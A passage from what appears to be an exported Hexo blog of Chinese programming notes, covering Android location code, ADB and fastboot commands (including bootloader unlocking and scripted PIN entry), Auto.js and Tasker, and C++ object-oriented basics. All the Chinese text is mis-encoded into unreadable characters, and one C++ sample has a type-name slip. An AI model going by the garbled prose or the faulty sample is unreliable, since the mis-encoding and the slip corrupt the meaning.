class="keyword">void</span> <span class="title">onPause</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onPause();</span><br><span class="line">        mapView.onPause();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onRequestPermissionsResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="meta">@NonNull</span> String[] permissions, <span class="meta">@NonNull</span> <span class="keyword">int</span>[] grantResults)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (requestCode) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> (grantResults.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> result : grantResults) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (result != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">                            Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;å¿…é¡»åŒæ„æ‰€æœ‰æƒé™æ‰èƒ½ä½¿ç”¨æœ¬ç¨‹åº&quot;</span>,</span><br><span class="line">                                    Toast.LENGTH_SHORT).show();</span><br><span class="line">                            finish();</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    requestLocation();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;å‘ç”ŸæœªçŸ¥é”™è¯¯&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">                    finish();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initLocation</span><span class="params">()</span></span>&#123;</span><br><span class="line">        LocationClientOption option = <span class="keyword">new</span> LocationClientOption();</span><br><span class="line"><span class="comment">//        æ¯éš”äº”ç§’åˆ·æ–°å®šä½</span></span><br><span class="line">        option.setScanSpan(<span class="number">5000</span>);</span><br><span class="line"><span class="comment">//        å¼ºåˆ¶ä½¿ç”¨gpså®šä½</span></span><br><span class="line"><span class="comment">//        option.setLocationMode(LocationClientOption.LocationMode.Device_Sensors);</span></span><br><span class="line">        option.setIsNeedAddress(<span class="keyword">true</span>);</span><br><span class="line">        mLocationClient.setLocOption(option);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">requestLocation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        initLocation();</span><br><span class="line"><span class="comment">//        è°ƒç”¨LocationClientçš„start()æ–¹æ³•ï¼Œä¾¿å¯å‘èµ·å®šä½è¯·æ±‚</span></span><br><span class="line">        mLocationClient.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//    baidu sdk v7.2èµ·çš„æ–°è°ƒç”¨æ¥å£ï¼Œå¼‚æ­¥å®ç°ï¼Œè¿™é‡Œæˆ‘æ”¹äº†åŸä½œè€…çš„ä»£ç ï¼Œå› ä¸ºè™½ç„¶è¿˜èƒ½ç”¨ä½†ç™¾åº¦å®˜æ–¹æ–‡æ¡£æ¨èä½¿ç”¨æ­¤æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyLocationListener</span> <span class="keyword">extends</span> <span class="title">BDAbstractLocationListener</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceiveLocation</span><span class="params">(BDLocation location)</span> </span>&#123;</span><br><span class="line"><span class="comment">//            åœ¨åœ°å›¾ä¸Šæ˜¾ç¤ºä½ç½®</span></span><br><span class="line">            navigateTo(location);</span><br><span class="line"><span class="comment">//            runOnUiThread(new Runnable() &#123;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//                @Override</span></span><br><span class="line"><span class="comment">//                public void run() &#123;</span></span><br><span class="line"><span class="comment">//                    StringBuilder currentPosition = new StringBuilder();</span></span><br><span class="line"><span class="comment">//                    currentPosition.append(&quot;çº¬åº¦ï¼š&quot;).append(location.getLatitude()).</span></span><br><span class="line"><span class="comment">//                            append(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">//                    currentPosition.append(&quot;ç»çº¿ï¼š&quot;).append(location.getLongitude()).</span></span><br><span class="line"><span class="comment">//                            append(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">//                    currentPosition.append(&quot;å›½å®¶ï¼š&quot;).append(location.getCountry()).</span></span><br><span class="line"><span class="comment">//                            append(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">//                    currentPosition.append(&quot;çœï¼š&quot;).append(location.getProvince()).</span></span><br><span class="line"><span class="comment">//                            append(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">//                    currentPosition.append(&quot;å¸‚ï¼š&quot;).append(location.getCity()).</span></span><br><span class="line"><span class="comment">//                            append(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">//                    currentPosition.append(&quot;åŒºï¼š&quot;).append(location.getDistrict()).</span></span><br><span class="line"><span class="comment">//                            append(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">//                    currentPosition.append(&quot;è¡—é“ï¼š&quot;).append(location.getStreet()).</span></span><br><span class="line"><span class="comment">//                            append(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">//                    currentPosition.append(&quot;å®šä½æ–¹å¼ï¼š&quot;);</span></span><br><span class="line"><span class="comment">//                    if (location.getLocType() == BDLocation.TypeGpsLocation) &#123;</span></span><br><span class="line"><span class="comment">//                        currentPosition.append(&quot;GPS&quot;);</span></span><br><span class="line"><span class="comment">//                    &#125; else if (location.getLocType() ==</span></span><br><span class="line"><span class="comment">//                            BDLocation.TypeNetWorkLocation) &#123;</span></span><br><span class="line"><span class="comment">//                        currentPosition.append(&quot;ç½‘ç»œ&quot;);</span></span><br><span class="line"><span class="comment">//                    &#125;</span></span><br><span class="line"><span class="comment">//                    åœ¨æ˜¾ç¤ºåœ°å›¾çš„æ—¶å€™ä¸€å®šè¦æ³¨é‡Šä¸‹ä¸€å¥è¯ï¼Œä¸ç„¶ä¼šå› ä¸ºæ‰¾ä¸åˆ°textViewæ§ä»¶å´©æºƒ</span></span><br><span class="line"><span class="comment">//                    positionText.setText(currentPosition);</span></span><br><span class="line"><span class="comment">//                &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//            &#125;);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//        æ¯äº”ç§’åˆ·æ–°ä¼šéå¸¸çš„è€—ç”µï¼Œæ‰€ä»¥åœ¨ç¨‹åºè¿è¡Œç»“æŸååœæ­¢å®šä½</span></span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        mLocationClient.stop();</span><br><span class="line">        mapView.onDestroy();</span><br><span class="line">        baiduMap.setMyLocationEnabled(<span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









<h2 id="æ‚é¡¹"><a href="#æ‚é¡¹" class="headerlink" title="æ‚é¡¹"></a>æ‚é¡¹</h2><p>ctrl + o å¿«é€Ÿé‡è½½</p>
<p>alt + insertã€€è‡ªåŠ¨è¡¥å…¨get,setæ–¹æ³•</p>
<h3 id="adb-amp-fastboot-command"><a href="#adb-amp-fastboot-command" class="headerlink" title="adb &amp; fastboot command"></a>adb &amp; fastboot command</h3><h3 id="å¸¸ç”¨-ADB-å‘½ä»¤"><a href="#å¸¸ç”¨-ADB-å‘½ä»¤" class="headerlink" title="å¸¸ç”¨ ADB å‘½ä»¤"></a>å¸¸ç”¨ ADB å‘½ä»¤</h3><table>
<thead>
<tr>
<th>ä»£ç </th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>adb reboot bootloader</td>
<td>åœ¨ bootloader æ¨¡å¼ä¸‹é‡å¯</td>
</tr>
<tr>
<td>adb push</td>
<td>å°†æ–‡ä»¶ä»æœ¬åœ°ç³»ç»Ÿå¤åˆ¶åˆ° Android æ‰‹æœºçš„ä½ç½®</td>
</tr>
<tr>
<td>adb pull</td>
<td>å°†æ–‡ä»¶ä» Android å¤åˆ¶åˆ°æ‚¨çš„ç³»ç»Ÿ</td>
</tr>
<tr>
<td>adb devices</td>
<td>æ˜¾ç¤ºæ‰€æœ‰è¿æ¥çš„ adb å…¼å®¹è®¾å¤‡</td>
</tr>
<tr>
<td>adb backup</td>
<td>å¤‡ä»½ Android è®¾å¤‡</td>
</tr>
<tr>
<td>adb install</td>
<td>å°†åº”ç”¨ç¨‹åºä»ç³»ç»Ÿçš„ apk æ–‡ä»¶ä½ç½®å®‰è£…åˆ° Android è®¾å¤‡ä¸Š</td>
</tr>
<tr>
<td>adb reboot</td>
<td>åœ¨æ­£å¸¸æ¨¡å¼ä¸‹é‡æ–°å¯åŠ¨ Android æ‰‹æœº</td>
</tr>
<tr>
<td>adb connect</td>
<td>é€šè¿‡ WiFi ç½‘ç»œä½¿ç”¨adbå‘½ä»¤</td>
</tr>
<tr>
<td>adb shell screencap</td>
<td>è·å–è®¾å¤‡çš„å±å¹•æˆªå›¾</td>
</tr>
</tbody></table>
<h3 id="å¸¸ç”¨-Fastboot-å‘½ä»¤"><a href="#å¸¸ç”¨-Fastboot-å‘½ä»¤" class="headerlink" title="å¸¸ç”¨ Fastboot å‘½ä»¤"></a>å¸¸ç”¨ Fastboot å‘½ä»¤</h3><table>
<thead>
<tr>
<th>ä»£ç </th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>fastboot devices</td>
<td>æ˜¾ç¤ºè¿æ¥çš„ Android è®¾å¤‡çš„åºåˆ—å·</td>
</tr>
<tr>
<td>fastboot oem unlock</td>
<td>è§£å¼€ bootloader é”ï¼ˆAndroid 5.0 åŠä»¥ä¸‹ï¼‰</td>
</tr>
<tr>
<td>fastboot oem lock</td>
<td>æ¢å¤ bootloader é”ï¼ˆAndroid 5.0 åŠä»¥ä¸‹ï¼‰</td>
</tr>
<tr>
<td>fastboot flashing unlock</td>
<td>è§£å¼€ bootloader é”ï¼ˆAndroid 6.0 åŠä»¥ä¸Šï¼‰</td>
</tr>
<tr>
<td>fastboot flashing lock</td>
<td>æ¢å¤ bootloader é”</td>
</tr>
<tr>
<td>fastboot flash recovery (filename)</td>
<td>åœ¨ bootloader æ¨¡å¼ä¸­å‘è®¾å¤‡åˆ·å…¥æ–‡ä»¶</td>
</tr>
<tr>
<td>fastboot oem device-info</td>
<td>æŸ¥çœ‹bootloaderé”</td>
</tr>
</tbody></table>
<p><strong>fastbootåˆ·å†™éœ€è¦rootæƒé™</strong></p>
<p><strong>ä¸€èˆ¬åˆ·æœºç›´æ¥æ ¹æ®å‚å•†æä¾›çš„shellè„šæœ¬ä¸€æŠŠæ¢­å®Œäº‹</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell pm list packagesã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€//åº”ç”¨ç¨‹åºåˆ—è¡¨</span><br><span class="line">adb push [æ–‡ä»¶] /sdcard/Downloadã€€ã€€ã€€ã€€ã€€ã€€//å°†æ–‡ä»¶æ¨é€åˆ°downloadç›®å½•</span><br><span class="line">pm uninstall -k --user 0 [package_name]ã€€ã€€//ä¸ºç”¨æˆ·å¸è½½åº”ç”¨ç¨‹åº</span><br></pre></td></tr></table></figure>



<p>ç½‘ç»œè¿æ¥adb</p>
<p>adb connect è®¾å¤‡åœ°å€</p>
<p>åˆ·ç¬¬ä¸‰æ–¹recovery</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">éœ€è¦rootæƒé™</span></span><br><span class="line">fastboot flash recovery xxx.img</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb backup -f &lt;filename&gt; --twrp &lt;options&gt;</span><br><span class="line">&lt;filename&gt; æ˜¯å¤‡ä»½æ•°æ®æ–‡ä»¶åï¼Œå¦‚æœä¸å¡«åˆ™ä¸ºé»˜è®¤åç§° backup.abï¼›</span><br><span class="line">&lt;options&gt; åŒ…å«ä¸‹åˆ—å‘½ä»¤ï¼š</span><br><span class="line">--compress: å¯¹å¤‡ä»½æ–‡ä»¶è¿›è¡Œå‹ç¼©</span><br><span class="line">system: å¤‡ä»½æ ¹ç›®å½•ä¸‹ system æ•°æ®</span><br><span class="line">cache: å¤‡ä»½æ ¹ç›®å½•ä¸‹ cache æ•°æ®</span><br><span class="line">data: å¤‡ä»½æ ¹ç›®å½•ä¸‹ data æ•°æ®</span><br><span class="line">boot: å¤‡ä»½æ ¹ç›®å½•ä¸‹ boot æ•°æ®</span><br><span class="line">(å…¶ä»–åˆ†åŒºåŒç†)</span><br></pre></td></tr></table></figure>







<h4 id="é¿å…åœ¨ä¸»çº¿ç¨‹å‘é€http-è¯·æ±‚ä¿®æ”¹ui"><a href="#é¿å…åœ¨ä¸»çº¿ç¨‹å‘é€http-è¯·æ±‚ä¿®æ”¹ui" class="headerlink" title="é¿å…åœ¨ä¸»çº¿ç¨‹å‘é€http è¯·æ±‚ä¿®æ”¹ui"></a>é¿å…åœ¨ä¸»çº¿ç¨‹å‘é€http è¯·æ±‚ä¿®æ”¹ui</h4><p>å¯åŠ¨ä¸€ä¸ªå­çº¿ç¨‹è¿›è¡Œç½‘è·¯è¯·æ±‚æ“ä½œï¼Œç„¶åå†ç”¨Handleræ›´æ–°ç•Œé¢</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    <span class="keyword">this</span>.setContentView(R.layout.share_mblog_view);</span><br><span class="line">    <span class="keyword">new</span> Thread(runnable).start();  <span class="comment">//å¯åŠ¨å­çº¿ç¨‹</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//handler å¤„ç†è¿”å›çš„è¯·æ±‚ç»“æœ</span></span><br><span class="line">Handler handler = <span class="keyword">new</span> Handler()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleMessage</span><span class="params">(Message msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.handleMessage(msg);</span><br><span class="line">        Bundle data = msg.getData();</span><br><span class="line">        String val = data.getString(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">         <span class="comment">// <span class="doctag">TODO:</span> æ›´æ–°ç•Œé¢</span></span><br><span class="line">         <span class="comment">//</span></span><br><span class="line">        Log.i(<span class="string">&quot;mylog&quot;</span>,<span class="string">&quot;è¯·æ±‚ç»“æœ--&gt;&quot;</span> + val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ–°çº¿ç¨‹è¿›è¡Œç½‘ç»œè¯·æ±‚</span></span><br><span class="line">Runnable runnable = <span class="keyword">new</span> Runnable()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">         <span class="comment">//</span></span><br><span class="line">         <span class="comment">// <span class="doctag">TODO:</span> http request.</span></span><br><span class="line">         <span class="comment">//</span></span><br><span class="line">        Message msg = <span class="keyword">new</span> Message();</span><br><span class="line">        Bundle data = <span class="keyword">new</span> Bundle();</span><br><span class="line">        data.putString(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;è¯·æ±‚ç»“æœ&quot;</span>);</span><br><span class="line">        msg.setData(data);</span><br><span class="line">        handler.sendMessage(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="android-9ä»¥ä¸Šå¼€å¯å®šä½æœåŠ¡"><a href="#android-9ä»¥ä¸Šå¼€å¯å®šä½æœåŠ¡" class="headerlink" title="android 9ä»¥ä¸Šå¼€å¯å®šä½æœåŠ¡"></a>android 9ä»¥ä¸Šå¼€å¯å®šä½æœåŠ¡</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Enable: </span><br><span class="line">adb shell settings put secure location_mode 3</span><br><span class="line">Disable: </span><br><span class="line">adb shell settings put secure location_mode 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">æ¨¡æ‹Ÿæ»‘åŠ¨è§£é”</span></span><br><span class="line">adb shell input swipe 300 300 500 1000 100</span><br><span class="line"><span class="meta">#</span><span class="bash">è¾“å…¥å¯†ç </span></span><br><span class="line">adb  shell input text 1234</span><br><span class="line"><span class="meta">#</span><span class="bash">æˆ–è€…æ¨¡æ‹Ÿè¾“å…¥</span></span><br><span class="line">input keyevent KEYCODE_5</span><br></pre></td></tr></table></figure>

<p>adb shell  è°ƒç”¨autojs(rootæƒ…å†µä¸‹)</p>
<p><code>am start -n org.autojs.autojs/.external.open.RunIntentActivity -d &quot;file:///storage/emulated/0/è„šæœ¬/test.js&quot;</code></p>
<p>autojs å‘taskerä¼ å€¼</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//autojsæ–‡ä»¶test.js</span></span><br><span class="line">auto</span><br><span class="line"><span class="built_in">console</span>.show()</span><br><span class="line">app.sendBroadcast(&#123;</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&quot;autojs.intent.action.MAIN&quot;</span>,</span><br><span class="line">    <span class="attr">extras</span>: &#123;</span><br><span class="line">        <span class="attr">from</span>: <span class="string">&quot;Autoxjs&quot;</span>,</span><br><span class="line">        <span class="attr">version</span>: <span class="string">&quot;5.3.0&quot;</span>,</span><br><span class="line">        <span class="attr">info</span>:<span class="string">&quot;you get it&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>ç„¶åtaskerä¸­é…ç½®æ–‡ä»¶é€‰æ‹©æ”¶åˆ°çš„æ„å›¾ï¼Œæ“ä½œå¡«<code>autojs.intent.action.MAIN</code>ç„¶åæŒ‡å‘ä¸€ä¸ªå¯ä»¥æ˜¾ç¤ºå˜é‡çš„æ§ä»¶ï¼Œé€šè¿‡%from , %version , %infoå–å‡º</p>
]]></content>
      <categories>
        <category>ç¼–ç¨‹è¯­è¨€</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>åŸºç¡€è¯­æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title>C++è¯­æ³•ç¬”è®°</title>
    <url>/2021/11/06/c++%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
    <content><![CDATA[<h1 id="c-é¢å‘å¯¹è±¡"><a href="#c-é¢å‘å¯¹è±¡" class="headerlink" title="c++é¢å‘å¯¹è±¡"></a>c++é¢å‘å¯¹è±¡</h1><p>é¢å‘å¯¹è±¡ç¨‹åºçš„å››ä¸ªç‰¹ç‚¹ï¼šå°è£…ã€ç»§æ‰¿ã€å¤šæ€ã€æŠ½è±¡</p>
<p>å¯¹è±¡çš„ä¸¤ä¸ªè¦ç´ ï¼š<strong>å±æ€§</strong>å’Œ<strong>è¡Œä¸º</strong></p>
<p>ç±»æ˜¯å¯¹è±¡çš„<strong>æŠ½è±¡</strong>ï¼Œå¯¹è±¡æ˜¯ç±»çš„<strong>å®ä¾‹</strong></p>
<p><em>å¤šæ€æ€§</em>   æ˜¯æŒ‡ï¼šç”±ç»§æ‰¿è€Œäº§ç”Ÿçš„ä¸åŒçš„<strong>æ´¾ç”Ÿç±»</strong>ï¼Œå…¶å¯¹å¯¹è±¡çš„<strong>åŒä¸€æ¶ˆæ¯</strong>ä¼šåšå‡º<strong>ä¸åŒçš„å“åº”</strong></p>
<p><em>è½¬æ¢æ„é€ å‡½æ•°</em>  çš„ä½œç”¨æ˜¯å°†ä¸€ä¸ª<strong>å…¶å®ƒç±»å‹</strong>çš„æ•°æ®è½¬æ¢æˆä¸€ä¸ª<strong>ç±»çš„å¯¹è±¡</strong></p>
<p><em>ç±»å‹è½¬æ¢å‡½æ•°</em>  çš„ä½œç”¨æ˜¯å°†ä¸€ä¸ª<strong>ç±»çš„å¯¹è±¡</strong>è½¬æ¢æˆ<strong>å¦ä¸€ç±»å‹çš„æ•°æ®</strong>ï¼Œåœ¨å‡½æ•°åé¢å‰ä¸èƒ½æŒ‡å®š<strong>å‡½æ•°ç±»å‹</strong>ï¼Œå‡½æ•°æ²¡æœ‰<strong>å‚æ•°</strong></p>
<p><em>è™šåŸºç±»</em>   åœ¨ç»§æ‰¿<strong>é—´æ¥å…±åŒåŸºç±»</strong>æ—¶åªä¿ç•™ä¸€ä»½æˆå‘˜ï¼Œè™šåŸºç±»ä¸æ˜¯å£°æ˜åŸºç±»æ—¶å£°æ˜çš„ï¼Œè€Œæ˜¯åœ¨å£°æ˜æ´¾ç”Ÿç±»æ—¶ï¼ŒæŒ‡å®šç»§æ‰¿æ–¹å¼æ—¶å£°æ˜çš„</p>
<span id="more"></span>

<h2 id="ç±»å’Œå¯¹è±¡"><a href="#ç±»å’Œå¯¹è±¡" class="headerlink" title="ç±»å’Œå¯¹è±¡"></a>ç±»å’Œå¯¹è±¡</h2><h4 id="é™æ€æˆå‘˜"><a href="#é™æ€æˆå‘˜" class="headerlink" title="é™æ€æˆå‘˜"></a>é™æ€æˆå‘˜</h4><p><em><strong>ç›®çš„ï¼š çªç ´ä¸åŒç±»å¯¹è±¡ä¸­çš„æ•°æ®å…±äº«ï¼Œç±»ä¼¼å…¨å±€å˜é‡</strong></em> </p>
<ul>
<li><p>é™æ€æ•°æ®æˆå‘˜</p>
<ul>
<li>å…³é”®å­—<code>static</code>åŠ åœ¨æ•°æ®ç±»å‹ä¹‹å‰</li>
<li>åªèƒ½åœ¨ <em>ç±»å¤–</em>  ä»¥<code>æ•°æ®ç±»å‹ ç±»å :: é™æ€æˆå‘˜å‡½æ•°å =  åˆå€¼</code>çš„å½¢å¼è¿›è¡Œåˆå§‹åŒ–</li>
<li><code>static</code> æ•°æ®æˆå‘˜ä¸å¯ä»¥åšæˆæ„é€ å‡½æ•°</li>
</ul>
</li>
<li><p>é™æ€æˆå‘˜å‡½æ•°</p>
<ul>
<li><p>ä¸»è¦ç”¨æ¥è®¿é—®é™æ€æˆå‘˜å‡½æ•°ï¼Œ(å¦‚ä¸‹ä¾‹)è®¿é—®éé™æ€æˆå‘˜æ—¶ç”¨â€œ.â€è¿ç®—ç¬¦</p>
</li>
<li><p>æ²¡æœ‰thisæŒ‡é’ˆï¼Œè‹¥è¦ä½¿ç”¨å¯¹è±¡æˆå‘˜å¿…é¡»å†™å…¥å‚æ•°</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">Test</span> <span class="params">(ObjName&amp; Object)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Object.ObjMember;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h4 id="å‹å…ƒ"><a href="#å‹å…ƒ" class="headerlink" title="å‹å…ƒ"></a>å‹å…ƒ</h4><ol>
<li>ç±»å¤–æ™®é€šå‡½æ•° ä½œä¸º  å‹å…ƒå‡½æ•°<ul>
<li>åœ¨ç±»å†…å£°æ˜ç±»å¤–å‡½æ•°æ˜¯å‹å…ƒå‡½æ•°ï¼Œå£°æ˜å‰åŠ <code>friend</code></li>
<li>å®ç°åœ¨ç±»å¤–è°ƒç”¨ç±»å†…privateç±»å‹çš„æ•°æ®æˆå‘˜</li>
</ul>
</li>
<li>ï¼ˆå¦ä¸€ä¸ªç±»çš„ï¼‰æˆå‘˜å‡½æ•° ä½œä¸º  å‹å…ƒå‡½æ•°<ul>
<li>åœ¨ä¸€ä¸ªç±»çš„æˆå‘˜å‡½æ•°ä¸­å£°æ˜å¦ä¸€ä¸ªç±»æˆå‘˜å‡½æ•°ä¸ºå‹å…ƒ</li>
<li>æœ‰æ—¶éœ€è¦æå‰å£°æ˜ç±»ï¼Œ<code>class ClassName;</code></li>
</ul>
</li>
</ol>
<h4 id="å¸¸å¯¹è±¡-const-å’Œå¸¸å¼•ç”¨"><a href="#å¸¸å¯¹è±¡-const-å’Œå¸¸å¼•ç”¨" class="headerlink" title="*å¸¸å¯¹è±¡(const)å’Œå¸¸å¼•ç”¨"></a>*å¸¸å¯¹è±¡(const)å’Œå¸¸å¼•ç”¨</h4><ol>
<li><p>å¸¸æ•°æ®æˆå‘˜</p>
<p><code>const int test;</code>å³å®šä¹‰äº†ä¸€ä¸ªintç±»å‹çš„æ•°æ®æˆå‘˜</p>
<ul>
<li>æ„é€ å‡½æ•°åªèƒ½ç”¨åˆå§‹</li>
<li>åŒ–åˆ—è¡¨å¯¹å¸¸æˆå‘˜å‡½æ•°è¿›è¡Œåˆå§‹åŒ–</li>
</ul>
</li>
<li><p>å¸¸æˆå‘˜å‡½æ•°</p>
<p> åœ¨æˆå‘˜å‡½æ•°çš„ç»“å°¾åŠ ä¸Šä¸€ä¸ª<code>const</code></p>
<ul>
<li><p>å¯ä»¥è°ƒç”¨å¸¸æ•°æ®æˆå‘˜ï¼Œå¸¸å¯¹è±¡ å’Œ æ™®é€šæ•°æ®æˆå‘˜</p>
</li>
<li><p>ä¸èƒ½æ”¹å˜ä»»ä½•ä¸€ä¸ªè¢«è°ƒç”¨æ•°æ®çš„å€¼</p>
</li>
</ul>
</li>
<li><p>å¸¸å¯¹è±¡å’Œå¸¸æŒ‡é’ˆ</p>
<ul>
<li><code>ç±»å * const æŒ‡é’ˆå</code>æŒ‡é’ˆæŒ‡å‘çš„å¯¹è±¡ä¸èƒ½æ”¹å˜ï¼Œä½†å¯¹è±¡å€¼å¯ä»¥æ”¹å˜</li>
<li><code>const ç±»å  * æŒ‡é’ˆå</code>æŒ‡é’ˆæŒ‡å‘çš„å¯¹è±¡å¯ä»¥æ”¹å˜ï¼ˆä¹Ÿå¯ä»¥æŒ‡å‘éconstç±»ï¼‰ï¼Œä½†å¯¹è±¡å€¼ä¸èƒ½æ”¹å˜</li>
<li>å¦‚æœä¸€ä¸ªå˜é‡è¢«å£°æ˜æˆäº†å¸¸å˜é‡ï¼Œåªèƒ½ç”¨conståœ¨å‰çš„é‚£ä¸€ç§æŒ‡é’ˆ</li>
</ul>
</li>
<li><p>å¯¹è±¡çš„å¸¸åº”å¼•ç”¨</p>
</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  å¯¹è±¡çš„å¼•ç”¨</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Time</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    	<span class="built_in">Time</span>(<span class="keyword">int</span> h,<span class="keyword">int</span> m,<span class="keyword">int</span> s):<span class="built_in">hour</span>(h),<span class="built_in">minute</span>(m),<span class="built_in">sec</span>(s)&#123;&#125;</span><br><span class="line">    	<span class="keyword">int</span> hour;</span><br><span class="line">    	<span class="keyword">int</span> minute;</span><br><span class="line">    	<span class="keyword">int</span> sec;</span><br><span class="line">&#125;;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(time &amp;t)</span></span></span><br><span class="line"><span class="function">    </span>&#123;t.hour = <span class="number">18</span>;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>   </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="function">Time <span class="title">t1</span><span class="params">(<span class="number">10</span>,<span class="number">13</span>,<span class="number">56</span>)</span></span>;</span><br><span class="line">        <span class="built_in">fun</span> (t1);</span><br><span class="line">        cout &lt;&lt; t1.hour &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>ä¸æƒ³æ”¹å˜t1çš„å€¼å¯ä»¥ç”¨<code>void fun(const Time &amp; t)</code></li>
</ul>
<h4 id="é‡è½½è¿ç®—ç¬¦"><a href="#é‡è½½è¿ç®—ç¬¦" class="headerlink" title="é‡è½½è¿ç®—ç¬¦"></a>é‡è½½è¿ç®—ç¬¦</h4><p>é‡è½½è¿ç®—ç¬¦æ ¼å¼(åªèƒ½ä½œä¸ºæˆå‘˜å‡½æ•°)</p>
